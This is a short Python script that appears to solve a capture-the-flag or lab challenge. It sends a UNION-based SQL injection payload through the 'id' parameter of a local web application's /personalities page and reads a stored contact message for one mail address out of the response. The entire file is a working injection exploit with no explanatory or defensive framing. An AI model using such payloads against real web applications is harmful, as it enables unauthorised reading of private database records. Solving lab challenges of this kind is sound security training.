import requests
import sys
from bs4 import BeautifulSoup
import re


def soupify_response(r):
    return BeautifulSoup(r.text, 'html.parser')

base_addr = "http://0.0.0.0" if len(sys.argv) > 1 else "http://127.0.0.1"

payload = {"id": "1' union all select name,message from contact_messages where mail like 'james@bond.mi5"}

r = requests.get(base_addr+'/personalities', params=payload)

soup = soupify_response(r)
message = soup.find(string=re.compile("james:"))
print(message[6:])
